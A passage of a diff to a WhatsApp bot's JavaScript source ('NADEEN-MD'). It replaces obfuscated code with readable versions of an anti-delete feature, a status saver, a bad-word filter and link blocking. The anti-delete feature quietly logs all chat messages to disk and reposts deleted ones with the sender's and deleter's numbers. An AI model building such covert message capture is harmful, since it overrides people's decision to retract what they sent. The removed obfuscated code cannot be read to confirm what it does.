-                                  async function _0x2aad0f() {
-                                    const _0x12c36c = _0x3516ba;
-                                    var _0x484396 = _0x4d32a6('');
-                                    const _0x2d7ee1 = _0x1b6df1(_0x55533e, _0x746d71);
-                                    let _0x5e20c0 = await _0x2d7ee1[_0x12c36c(0xd9)](_0x484396)
-                                      , _0x2f1bac = require(_0x12c36c(0xa5))
-                                      , _0x1dd078 = _0x2f1bac['fromBuffer'](_0x5e20c0);
-                                    await fs['promises'][_0x12c36c(0x18f)]('./' + _0x1dd078[_0x12c36c(0xfd)], _0x5e20c0);
-                                    if (_0x746d71['message']['audioMessage']) {
-                                      const _0x456914 = await _0x55533e[_0x12c36c(0x199)](_0x262521, {
-                                        'audio': fs[_0x12c36c(0x11e)]('./' + _0x1dd078[_0x12c36c(0xfd)])
-                                        , 'mimetype': _0x746d71[_0x12c36c(0x19d)][_0x12c36c(0x1a5)][_0x12c36c(0x98)]
-                                        , 'fileName': _0x43833d['id'] + '.mp3'
-                                      });
-                                      return await _0x55533e['sendMessage'](_0x262521, {
-                                        'text': _0x12c36c(0x78) + _0x51481d + _0x12c36c(0x187) + _0x31fe65 + '_\x0a'
-                                      }, {
-                                        'quoted': _0x456914
-                                      });
-                                    } else {
-                                      if (_0x746d71[_0x12c36c(0x19d)][_0x12c36c(0x1a5)][_0x12c36c(0x1b9)] === _0x12c36c(0x141)) {
-                                        const _0x5809d2 = await _0x55533e[_0x12c36c(0x199)](_0x262521, {
-                                          'audio': fs[_0x12c36c(0x11e)]('./' + _0x1dd078[_0x12c36c(0xfd)])
-                                          , 'mimetype': _0x746d71[_0x12c36c(0x19d)]['audioMessage'][_0x12c36c(0x98)]
-                                          , 'ptt': 'true'
-                                          , 'fileName': _0x43833d['id'] + '.mp3'
-                                        });
-                                        return await _0x55533e[_0x12c36c(0x199)](_0x262521, {
-                                          'text': _0x12c36c(0x78) + _0x51481d + _0x12c36c(0x187) + _0x31fe65 + '_\x0a'
-                                        }, {
-                                          'quoted': _0x5809d2
-                                        });
-                                      }
-                                    }
-                                  }
-                                  _0x2aad0f();
-                                } else {
-                                  if (_0x746d71['type'] === 'stickerMessage') {
-                                    async function _0x1d3661() {
-                                      const _0x51c31d = _0x3516ba;
-                                      var _0x39e244 = _0x4d32a6('');
-                                      const _0x2343b7 = _0x1b6df1(_0x55533e, _0x746d71);
-                                      let _0x19dc8e = await _0x2343b7['download'](_0x39e244)
-                                        , _0x2eb1be = require('file-type')
-                                        , _0x34ded2 = _0x2eb1be['fromBuffer'](_0x19dc8e);
-                                      await fs['promises']['writeFile']('./' + _0x34ded2[_0x51c31d(0xfd)], _0x19dc8e);
-                                      if (_0x746d71[_0x51c31d(0x19d)][_0x51c31d(0x19e)]) {
-                                        const _0x19a98b = await _0x55533e[_0x51c31d(0x199)](_0x262521, {
-                                          'sticker': fs[_0x51c31d(0x11e)]('./' + _0x34ded2['ext'])
-                                          , 'package': 'NADEEN-MD 🌟'
-                                        });
-                                        return await _0x55533e[_0x51c31d(0x199)](_0x262521, {
-                                          'text': _0x51c31d(0x78) + _0x51481d + _0x51c31d(0x187) + _0x31fe65 + '_\x0a'
-                                        }, {
-                                          'quoted': _0x19a98b
-                                        });
-                                      } else {
-                                        const _0x539cfc = await _0x55533e[_0x51c31d(0x199)](_0x262521, {
-                                          'sticker': fs[_0x51c31d(0x11e)]('./' + _0x34ded2['ext'])
-                                          , 'package': _0x51c31d(0x13a)
-                                        });
-                                        return await _0x55533e[_0x51c31d(0x199)](_0x262521, {
-                                          'text': '🚫 *This message was deleted !!*\x0a\x0a  🚮 *Deleted by:* _' + _0x51481d + _0x51c31d(0x187) + _0x31fe65 + '_\x0a'
-                                        }, {
-                                          'quoted': _0x539cfc
-                                        });
-                                      }
-                                    }
-                                    _0x1d3661();
-                                  }
-                                }
-                              }
-                            }
-                          }
-                        }
-                      }
-                    }
-                  }
-                }
-              } else console[_0x3516ba(0xfa)](_0x3516ba(0xb8));
-            }
-            _0x4b9a40['msg'] && _0x4b9a40[_0x297513(0xe5)][_0x297513(0x12d)] === 0x0 ? _0x4d1697(_0x4b9a40) : _0x4d4112(_0x4b9a40);
-          }
+    }
+    
+    function saveChatData(remoteJid, messageId, chatData) {
+      const chatDir = path.join(baseDir, remoteJid);
+    
+      if (!fs.existsSync(chatDir)) {
+        fs.mkdirSync(chatDir, { recursive: true });
+      }
+    
+      const chatFilePath = path.join(chatDir, `${messageId}.json`);
+    
+      try {
+        fs.writeFileSync(chatFilePath, JSON.stringify(chatData, null, 2));
+       // console.log('Chat data saved successfully.');
+      } catch (error) {
+        console.error('Error saving chat data:', error);
+      }
+    }
+        
+    function handleIncomingMessage(message) {
+      const remoteJid = from //message.key.remoteJid;
+      const messageId = message.key.id;
+    
+      const chatData = loadChatData(remoteJid, messageId);
+    
+      chatData.push(message);
+    
+      saveChatData(remoteJid, messageId, chatData);
+    
+    //  console.log('Message received and saved:', messageId);
+    }
+    
+    
+    const delfrom = from
+    function handleMessageRevocation(revocationMessage) {
+    //const remoteJid = revocationMessage.message.protocolMessage.key.remoteJid;
+     //const messageId = revocationMessage.message.protocolMessage.key.id;
+    const remoteJid = from // revocationMessage.msg.key.remoteJid;
+    const messageId = revocationMessage.msg.key.id;
+    
+        
+     // console.log('Received revocation message with ID:', messageId);
+    
+      const chatData = loadChatData(remoteJid, messageId);
+    
+       const originalMessage = chatData[0]   
+    
+      if (originalMessage) {
+        const deletedBy = revocationMessage.sender.split('@')[0];
+        const sentBynn = originalMessage.key.participant ?? revocationMessage.sender;
+    const sentBy = sentBynn.split('@')[0];
+          if ( deletedBy.includes(botNumber) || sentBy.includes(botNumber) ) return;
+     if(originalMessage.message && originalMessage.message.conversation && originalMessage.message.conversation !== ''){
+         const messageText = originalMessage.message.conversation;
+   
+         var xx = '```'
+     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${messageText}${xx}` });
+    //........................................//........................................
+    }else if(originalMessage.msg.type ==='MESSAGE_EDIT'){
+     conn.sendMessage(delfrom, { text: `❌ *edited message detected* ${originalMessage.message.editedMessage.message.protocolMessage.editedMessage.conversation}` },{quoted: mek});
+     
+    //........................................//........................................
+    } else if(originalMessage.message && originalMessage.message.exetendedTextMessage && originalMessage.msg.text ){ //&& originalMessage.message.exetendedTextMessage.text && originalMessage.message.exetendedTextMessage.text !== ''){
+        const messageText = originalMessage.msg.text;
+    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
+    
+     var xx = '```'
+     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${messageText}${xx}` });
+    } else if(originalMessage.message && originalMessage.message.exetendedTextMessage ){ //&& originalMessage.message.exetendedTextMessage.text && originalMessage.message.exetendedTextMessage.text !== ''){
+        const messagetext = originalMessage.message.extendedTextMessage.text;
+    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
+     var xx = '```'
+     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.body}${xx}` });
+    }else if(originalMessage.type === 'extendedTextMessage') {
+    async function quotedMessageRetrive(){     
+    var nameJpg = getRandom('');
+    const ml = sms(conn, originalMessage)
+                
+    if(originalMessage.message.extendedTextMessage){
+    const messagetext = originalMessage.message.extendedTextMessage.text;
+    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
+        var xx = '```'
+     conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.message.extendedTextMessage.text}${xx}` });
+    }else{
+    const messagetext = originalMessage.message.extendedTextMessage.text;
+    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
+        conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${xx}${originalMessage.message.extendedTextMessage.text}${xx}` });
+    }
+    }
+    
+    quotedMessageRetrive()
+           
+    }else if(originalMessage.type === 'imageMessage') {
+          async function imageMessageRetrive(){      var nameJpg = getRandom('');
+    const ml = sms(conn, originalMessage)
+                let buff =  await ml.download(nameJpg)
+                let fileType = require('file-type');
+                let type = fileType.fromBuffer(buff);
+                await fs.promises.writeFile("./" + type.ext, buff);
+    if(originalMessage.message.imageMessage.caption){
+    const messageText = originalMessage.message.imageMessage.caption;
+    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
+    
+        await conn.sendMessage(delfrom, { image: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${originalMessage.message.imageMessage.caption}` })
+    }else{
+        await conn.sendMessage(delfrom, { image: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_` })
+    }       
         }
+    imageMessageRetrive()
+     
+    }else if(originalMessage.type === 'videoMessage') {
+          async function videoMessageRetrive(){      var nameJpg = getRandom('');
+    const ml = sms(conn, originalMessage)
+    
+    const vData = originalMessage.message.videoMessage.fileLength
+    const vTime = originalMessage.message.videoMessage.seconds;
+    const fileDataMB = config.MAX_SIZE
+    const fileLengthBytes = vData
+    const fileLengthMB = fileLengthBytes / (1024 * 1024);
+    const fileseconds = vTime
+    if(originalMessage.message.videoMessage.caption){
+    if (fileLengthMB < fileDataMB && fileseconds < 30*60 ) {
+                let buff =  await ml.download(nameJpg)
+                let fileType = require('file-type');
+                let type = fileType.fromBuffer(buff);
+                await fs.promises.writeFile("./" + type.ext, buff);
+    const messageText = originalMessage.message.videoMessage.caption;
+    if (isGroup && messageText.includes('chat.whatsapp.com')) return;
+    
+        await conn.sendMessage(delfrom, { video: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${originalMessage.message.videoMessage.caption}` })
+           }
+    }else{
+                let buff =  await ml.download(nameJpg)
+                let fileType = require('file-type');
+                let type = fileType.fromBuffer(buff);
+                await fs.promises.writeFile("./" + type.ext, buff);
+        const vData = originalMessage.message.videoMessage.fileLength
+    const vTime = originalMessage.message.videoMessage.seconds;
+    const fileDataMB = config.MAX_SIZE
+    const fileLengthBytes = vData
+    const fileLengthMB = fileLengthBytes / (1024 * 1024);
+    const fileseconds = vTime
+    if (fileLengthMB < fileDataMB && fileseconds < 30*60 ) {
+        await conn.sendMessage(delfrom, { video: fs.readFileSync("./" + type.ext), caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_` })
+    }
+    }       
+    }
+    videoMessageRetrive()
+    }else if(originalMessage.type === 'documentMessage') {
+          async function documentMessageRetrive(){      var nameJpg = getRandom('');
+    const ml = sms(conn, originalMessage)
+                let buff =  await ml.download(nameJpg)
+                let fileType = require('file-type');
+                let type = fileType.fromBuffer(buff);
+                await fs.promises.writeFile("./" + type.ext, buff);
+    
+        
+    
+    if(originalMessage.message.documentWithCaptionMessage){
+    
+    await conn.sendMessage(delfrom, { document: fs.readFileSync("./" + type.ext), mimetype: originalMessage.message.documentMessage.mimetype, fileName: originalMessage.message.documentMessage.fileName, caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n`});
+     
+    }else{
+    
+    await conn.sendMessage(delfrom, { document: fs.readFileSync("./" + type.ext), mimetype: originalMessage.message.documentMessage.mimetype, fileName: originalMessage.message.documentMessage.fileName, caption: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n`});
+    
+    }
+     }
+    
+    documentMessageRetrive()
+    }else if(originalMessage.type === 'audioMessage') {
+          async function audioMessageRetrive(){      var nameJpg = getRandom('');
+    const ml = sms(conn, originalMessage)
+                let buff =  await ml.download(nameJpg)
+                let fileType = require('file-type');
+                let type = fileType.fromBuffer(buff);
+                await fs.promises.writeFile("./" + type.ext, buff);
+    if(originalMessage.message.audioMessage){
+    const audioq = await conn.sendMessage(delfrom, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, fileName:  `${m.id}.mp3` })	
+    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: audioq});
+    
+    }else{
+    if(originalMessage.message.audioMessage.ptt === "true"){
+    
+    const pttt = await conn.sendMessage(delfrom, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, ptt: 'true',fileName: `${m.id}.mp3` })	
+    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: pttt});
+    
+     }
       }
-      const _0x3e95e4 = await _0x7a6b25('https://mv-visper-full-db.pages.dev/Main/bad_word.json');
-      if (config[_0x297513(0xf3)] == _0x297513(0x141)) {
-        if (!_0x3c46fb && !_0x2e3ea5[_0x297513(0x8f)](_0x14d9fb))
-          for (let _0x1ffe81 of _0x3e95e4) {
-            let _0x258ac9 = _0x267454[_0x297513(0x154)]();
-            if (_0x258ac9[_0x297513(0x8f)](_0x1ffe81) && !_0x258ac9['includes'](_0x297513(0xe6)) && !_0x258ac9[_0x297513(0x8f)](_0x297513(0xb7)) && !_0x258ac9[_0x297513(0x8f)](_0x297513(0x1aa))) {
-              (config[_0x297513(0x137)] == _0x297513(0x12f) || config[_0x297513(0x137)] == 'both') && await _0x55533e[_0x297513(0x199)](_0x222bfb, {
-                'delete': _0x4b9a40[_0x297513(0x81)]
-              });
-              await _0x55533e[_0x297513(0x199)](_0x222bfb, {
-                'text': '🚫 @' + _0x43833d[_0x297513(0x97)][_0x297513(0xc9)]('@')[0x0] + _0x297513(0x13f)
-                , 'mentions': [_0x14d9fb]
-              });
-              (config[_0x297513(0x137)] == _0x297513(0x127) || config[_0x297513(0x137)] == _0x297513(0x163)) && await _0x55533e[_0x297513(0xcf)](_0x222bfb, [_0x14d9fb], _0x297513(0x127));
-              break;
-            }
-          }
+     }
+    
+    audioMessageRetrive()
+    }else if(originalMessage.type === 'stickerMessage') {
+          async function stickerMessageRetrive(){      var nameJpg = getRandom('');
+    const ml = sms(conn, originalMessage)
+                let buff =  await ml.download(nameJpg)
+                let fileType = require('file-type');
+                let type = fileType.fromBuffer(buff);
+                await fs.promises.writeFile("./" + type.ext, buff);
+    if(originalMessage.message.stickerMessage){
+     
+    //await conn.sendMessage(from, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, fileName:  `${m.id}.mp3` })	
+     const sdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'NADEEN-MD 🌟'})
+    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: sdata});
+    
+    }else{
+    
+    const stdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'NADEEN-MD 🌟'})
+    return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: stdata});
+    
       }
-      if (_0x267454 === _0x297513(0x6e) || _0x267454 === 'Send' || _0x267454 === _0x297513(0x166) || _0x267454 === _0x297513(0x186) || _0x267454 === _0x297513(0xa8) || _0x267454 === _0x297513(0xc6) || _0x267454 === _0x297513(0x145) || _0x267454 === _0x297513(0x1a3) || _0x267454 === _0x297513(0x188) || _0x267454 === 'Save' || _0x267454 === _0x297513(0xb0) || _0x267454 === _0x297513(0x15b) || _0x267454 === _0x297513(0xd8) || _0x267454 === 'Ewam' || _0x267454 === 'sv' || _0x267454 === 'Sv' || _0x267454 === 'දාන්න' || _0x267454 === 'එවම්න') {
-        const _0x54f05a = JSON[_0x297513(0x10d)](_0x4b9a40[_0x297513(0x19d)], null, 0x2)
-          , _0xeb8bcc = JSON[_0x297513(0xc2)](_0x54f05a)
-          , _0x59faae = _0xeb8bcc[_0x297513(0x6d)]['contextInfo'][_0x297513(0x169)];
-        if (!_0x59faae) return;
-        const _0x4a7be3 = _0x2bfc06 => {
-          const _0x2afa00 = _0x297513
-            , _0x5e75a4 = {
-              'jpg': _0x2afa00(0x96)
-              , 'png': _0x2afa00(0x80)
-              , 'mp4': _0x2afa00(0x18a)
-            }
-            , _0xae8a06 = _0x2bfc06[_0x2afa00(0x7c)](_0x2afa00(0xc4), 0x0, 0x4);
-          return Object['keys'](_0x5e75a4)[_0x2afa00(0x171)](_0x22e4df => _0x5e75a4[_0x22e4df] === _0xae8a06);
+     }
+    
+    stickerMessageRetrive()
+             }
+         
+      } else {
+        console.log('Original message not found for revocation.');
+      }
+    }
+  
+    if (mek.msg && mek.msg.type === 0) {
+      handleMessageRevocation(mek);
+    } else {//if(mek.message && mek.message.conversation && mek.message.conversation !== ''){
+      handleIncomingMessage(mek);
+    
+        }
+    
+    }
+    }	
+    }
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+
+
+
+
+
+
+//============================================================================================================================================================
+
+
+
+  //==================================================================================================================================================================== 
+
+//==================================================================================================================================================================
+const bad = await fetchJson(`https://mv-visper-full-db.pages.dev/Main/bad_word.json`)
+if (config.ANTI_BAD  == "true"){
+  if (!isAdmins && !isMe) {
+  for (any in bad){
+  if (body.toLowerCase().includes(bad[any])){  
+    if (!body.includes('tent')) {
+      if (!body.includes('docu')) {
+        if (!body.includes('https')) {
+  if (groupAdmins.includes(sender)) return 
+  if (mek.key.fromMe) return   
+  await conn.sendMessage(from, { delete: mek.key })  
+  await conn.sendMessage(from , { text: '*Bad word detected..!*'})
+await conn.groupParticipantsUpdate(from, [sender], 'remove')
+ 
+  }}}}}}}
+
+if(body === "send" || body === "Send" || body === "Ewpm" || body === "ewpn" || body === "Dapan" || body === "dapan" || body === "oni" || body === "Oni" || body === "save" || body === "Save" || body === "ewanna" || body === "Ewanna" || body === "ewam" || body === "Ewam" || body === "sv" || body === "Sv"|| body === "දාන්න"|| body === "එවම්න"){
+    // if(!m.quoted) return reply("*Please Mention status*")
+    const data = JSON.stringify(mek.message, null, 2);
+    const jsonData = JSON.parse(data);
+    const isStatus = jsonData.extendedTextMessage.contextInfo.remoteJid;
+    if(!isStatus) return
+
+    const getExtension = (buffer) => {
+        const magicNumbers = {
+            jpg: 'ffd8ffe0',
+            png: '89504e47',
+            mp4: '00000018',
         };
-        if (_0x43833d['quoted'][_0x297513(0x12d)] === _0x297513(0xe3)) {
-          var _0xd21a4b = _0x4d32a6('');
-          let _0x202923 = await _0x43833d[_0x297513(0x185)]['download'](_0xd21a4b)
-            , _0x486fec = _0x4a7be3(_0x202923);
-          await fs[_0x297513(0x1b6)][_0x297513(0x18f)]('./' + _0x486fec, _0x202923);
-          const _0x51e1ee = _0x43833d['quoted']['imageMessage'][_0x297513(0x14a)];
-          await _0x55533e['sendMessage'](_0x222bfb, {
-            'image': fs[_0x297513(0x11e)]('./' + _0x486fec)
-            , 'caption': _0x51e1ee
-          });
-        } else {
-          if (_0x43833d['quoted']['type'] === _0x297513(0xf1)) {
-            var _0xd21a4b = _0x4d32a6('');
-            let _0x8fa98d = await _0x43833d[_0x297513(0x185)][_0x297513(0xd9)](_0xd21a4b)
-              , _0x509b27 = _0x4a7be3(_0x8fa98d);
-            await fs[_0x297513(0x1b6)][_0x297513(0x18f)]('./' + _0x509b27, _0x8fa98d);
-            const _0x3ddc72 = _0x43833d['quoted'][_0x297513(0xf1)][_0x297513(0x14a)];
-            let _0x545a7 = {
-              'video': fs[_0x297513(0x11e)]('./' + _0x509b27)
-              , 'mimetype': _0x297513(0x177)
-              , 'fileName': _0x43833d['id'] + _0x297513(0x179)
-              , 'caption': _0x3ddc72
-              , 'headerType': 0x4
-            };
-            await _0x55533e[_0x297513(0x199)](_0x222bfb, _0x545a7, {
-              'quoted': _0x4b9a40
-            });
-          }
-        }
-      }
+        const magic = buffer.toString('hex', 0, 4);
+        return Object.keys(magicNumbers).find(key => magicNumbers[key] === magic);
+    };
+
+    if(m.quoted.type === 'imageMessage') {
+        var nameJpg = getRandom('');
+        let buff = await m.quoted.download(nameJpg);
+        let ext = getExtension(buff);
+        await fs.promises.writeFile("./" + ext, buff);
+        const caption = m.quoted.imageMessage.caption;
+        await conn.sendMessage(from, { image: fs.readFileSync("./" + ext), caption: caption });
+    } else if(m.quoted.type === 'videoMessage') {
+        var nameJpg = getRandom('');
+        let buff = await m.quoted.download(nameJpg);
+        let ext = getExtension(buff);
+        await fs.promises.writeFile("./" + ext, buff);
+        const caption = m.quoted.videoMessage.caption;
+        let buttonMessage = {
+            video: fs.readFileSync("./" + ext),
+            mimetype: "video/mp4",
+            fileName: `${m.id}.mp4`,
+            caption: caption ,
+            headerType: 4
+        };
+        await conn.sendMessage(from, buttonMessage,{
+            quoted: mek
+        });
+    }
+}
+	   
+
+ 
+
+//================================ Auto voice funtion=================================================================
+
+
 if(body === "hi" || body === "Hi" || body === "hey" || body === "Hey" || body === "hii" || body === "Hii"){
    
  if (config.AUTO_VOICE == 'true') {
@@ -1278,289 +1395,200 @@ await conn.sendPresenceUpdate('recording', from);
  }	
 }
 
-      const _0x529c9a = require(_0x297513(0xfc))
-        , _0x1aa8c5 = _0x12771f ? _0x267454['slice'](0x1)[_0x297513(0xee)]()['split'](' ')[0x0][_0x297513(0x154)]() : ![];
-      if (_0x12771f) {
-        const _0x587290 = _0x529c9a[_0x297513(0x1c4)][_0x297513(0x171)](_0x4c1ac7 => _0x4c1ac7[_0x297513(0xa7)] === _0x1aa8c5) || _0x529c9a['commands'][_0x297513(0x171)](_0x5e1df3 => _0x5e1df3[_0x297513(0x173)] && _0x5e1df3[_0x297513(0x173)][_0x297513(0x8f)](_0x1aa8c5));
-        if (_0x587290) {
-          if (_0x587290['react']) _0x55533e['sendMessage'](_0x222bfb, {
-            'react': {
-              'text': _0x587290['react']
-              , 'key': _0x4b9a40[_0x297513(0x81)]
-            }
-          });
-          try {
-            _0x587290[_0x297513(0x1bb)](_0x55533e, _0x4b9a40, _0x43833d, {
-              'from': _0x222bfb
-              , 'prefix': _0x190cff
-              , 'l': l
-              , 'isSudo': _0x3805d1
-              , 'quoted': _0x545eb6
-              , 'body': _0x267454
-              , 'isCmd': _0x12771f
-              , 'isPre': _0x413721
-              , 'command': _0x2f0005
-              , 'args': _0x1b1aad
-              , 'q': _0x2e9303
-              , 'isGroup': _0xeed4d1
-              , 'sender': _0x14d9fb
-              , 'senderNumber': _0x8ddc90
-              , 'botNumber2': _0x4fcee5
-              , 'botNumber': _0x117f3b
-              , 'pushname': _0x35278d
-              , 'isMe': _0x3c46fb
-              , 'isOwner': _0xf8a499
-              , 'groupMetadata': _0x486172
-              , 'groupName': _0x5f09e3
-              , 'participants': _0x169562
-              , 'groupAdmins': _0x2e3ea5
-              , 'isBotAdmins': _0x89a709
-              , 'isAdmins': _0x4e29b8
-              , 'reply': _0xf13504
-            });
-          } catch (_0x37bbd2) {
-            console['error']('[PLUGIN ERROR] ', _0x37bbd2);
-          }
-        }
-      }
-      _0x529c9a[_0x297513(0x1c4)][_0x297513(0x176)](async _0x219277 => {
-        const _0x56d3df = _0x297513;
-        if (_0x267454 && _0x219277['on'] === _0x56d3df(0x1c2)) _0x219277[_0x56d3df(0x1bb)](_0x55533e, _0x4b9a40, _0x43833d, {
-          'from': _0x222bfb
-          , 'prefix': _0x190cff
-          , 'l': l
-          , 'isSudo': _0x3805d1
-          , 'quoted': _0x545eb6
-          , 'isPre': _0x413721
-          , 'body': _0x267454
-          , 'isCmd': _0x12771f
-          , 'command': _0x219277
-          , 'args': _0x1b1aad
-          , 'q': _0x2e9303
-          , 'isGroup': _0xeed4d1
-          , 'sender': _0x14d9fb
-          , 'senderNumber': _0x8ddc90
-          , 'botNumber2': _0x4fcee5
-          , 'botNumber': _0x117f3b
-          , 'pushname': _0x35278d
-          , 'isMe': _0x3c46fb
-          , 'isOwner': _0xf8a499
-          , 'groupMetadata': _0x486172
-          , 'groupName': _0x5f09e3
-          , 'participants': _0x169562
-          , 'groupAdmins': _0x2e3ea5
-          , 'isBotAdmins': _0x89a709
-          , 'isAdmins': _0x4e29b8
-          , 'reply': _0xf13504
-        });
-        else {
-          if (_0x4b9a40['q'] && _0x219277['on'] === _0x56d3df(0xf0)) _0x219277[_0x56d3df(0x1bb)](_0x55533e, _0x4b9a40, _0x43833d, {
-            'from': _0x222bfb
-            , 'l': l
-            , 'quoted': _0x545eb6
-            , 'body': _0x267454
-            , 'isSudo': _0x3805d1
-            , 'isCmd': _0x12771f
-            , 'isPre': _0x413721
-            , 'command': _0x219277
-            , 'args': _0x1b1aad
-            , 'q': _0x2e9303
-            , 'isGroup': _0xeed4d1
-            , 'sender': _0x14d9fb
-            , 'senderNumber': _0x8ddc90
-            , 'botNumber2': _0x4fcee5
-            , 'botNumber': _0x117f3b
-            , 'pushname': _0x35278d
-            , 'isMe': _0x3c46fb
-            , 'isOwner': _0xf8a499
-            , 'groupMetadata': _0x486172
-            , 'groupName': _0x5f09e3
-            , 'participants': _0x169562
-            , 'groupAdmins': _0x2e3ea5
-            , 'isBotAdmins': _0x89a709
-            , 'isAdmins': _0x4e29b8
-            , 'reply': _0xf13504
-          });
-          else {
-            if ((_0x219277['on'] === _0x56d3df(0x1c3) || _0x219277['on'] === _0x56d3df(0x157)) && _0x4b9a40[_0x56d3df(0x12d)] === _0x56d3df(0xe3)) _0x219277['function'](_0x55533e, _0x4b9a40, _0x43833d, {
-              'from': _0x222bfb
-              , 'prefix': _0x190cff
-              , 'l': l
-              , 'quoted': _0x545eb6
-              , 'isSudo': _0x3805d1
-              , 'body': _0x267454
-              , 'isCmd': _0x12771f
-              , 'command': _0x219277
-              , 'isPre': _0x413721
-              , 'args': _0x1b1aad
-              , 'q': _0x2e9303
-              , 'isGroup': _0xeed4d1
-              , 'sender': _0x14d9fb
-              , 'senderNumber': _0x8ddc90
-              , 'botNumber2': _0x4fcee5
-              , 'botNumber': _0x117f3b
-              , 'pushname': _0x35278d
-              , 'isMe': _0x3c46fb
-              , 'isOwner': _0xf8a499
-              , 'groupMetadata': _0x486172
-              , 'groupName': _0x5f09e3
-              , 'participants': _0x169562
-              , 'groupAdmins': _0x2e3ea5
-              , 'isBotAdmins': _0x89a709
-              , 'isAdmins': _0x4e29b8
-              , 'reply': _0xf13504
-            });
-            else _0x219277['on'] === _0x56d3df(0xef) && _0x4b9a40[_0x56d3df(0x12d)] === 'stickerMessage' && _0x219277[_0x56d3df(0x1bb)](_0x55533e, _0x4b9a40, _0x43833d, {
-              'from': _0x222bfb
-              , 'prefix': _0x190cff
-              , 'l': l
-              , 'quoted': _0x545eb6
-              , 'isSudo': _0x3805d1
-              , 'body': _0x267454
-              , 'isCmd': _0x12771f
-              , 'command': _0x219277
-              , 'args': _0x1b1aad
-              , 'isPre': _0x413721
-              , 'q': _0x2e9303
-              , 'isGroup': _0xeed4d1
-              , 'sender': _0x14d9fb
-              , 'senderNumber': _0x8ddc90
-              , 'botNumber2': _0x4fcee5
-              , 'botNumber': _0x117f3b
-              , 'pushname': _0x35278d
-              , 'isMe': _0x3c46fb
-              , 'isOwner': _0xf8a499
-              , 'groupMetadata': _0x486172
-              , 'groupName': _0x5f09e3
-              , 'participants': _0x169562
-              , 'groupAdmins': _0x2e3ea5
-              , 'isBotAdmins': _0x89a709
-              , 'isAdmins': _0x4e29b8
-              , 'reply': _0xf13504
-            });
-          }
-        }
-      });
-      if (config['ANTI_LINK'] == _0x297513(0x141)) {
-        if (!_0x3c46fb && !_0x2e3ea5[_0x297513(0x8f)](_0x14d9fb) && _0x89a709) {
-          const _0x3d2b90 = _0x267454[_0x297513(0x154)]()
-            , _0x29d32f = _0x297513(0x107)
-            , _0x1366bb = (config['VALUSE'] || [])[_0x297513(0x176)](_0x2935c1 => _0x2935c1[_0x297513(0xee)]()[_0x297513(0x154)]())
-            , _0x2fee59 = _0x3d2b90[_0x297513(0x8f)](_0x29d32f) || _0x1366bb[_0x297513(0x1a7)](_0x5cd840 => _0x3d2b90[_0x297513(0x8f)](_0x5cd840));
-          if (_0x2fee59) {
-            const _0xb0e769 = await _0x55533e[_0x297513(0x110)](_0x222bfb)
-              , _0x574be0 = 'https://chat.whatsapp.com/' + _0xb0e769;
-            _0x3d2b90[_0x297513(0x8f)](_0x574be0[_0x297513(0x154)]()) ? await _0x55533e[_0x297513(0x199)](_0x222bfb, {
-              'text': _0x297513(0xd3)
-              , 'mentions': [_0x14d9fb]
-            }) : ((config[_0x297513(0xaa)] == _0x297513(0x12f) || config['ANTILINK_ACTION'] == 'both') && await _0x55533e[_0x297513(0x199)](_0x222bfb, {
-              'delete': _0x4b9a40[_0x297513(0x81)]
-            }), await _0x55533e[_0x297513(0x199)](_0x222bfb, {
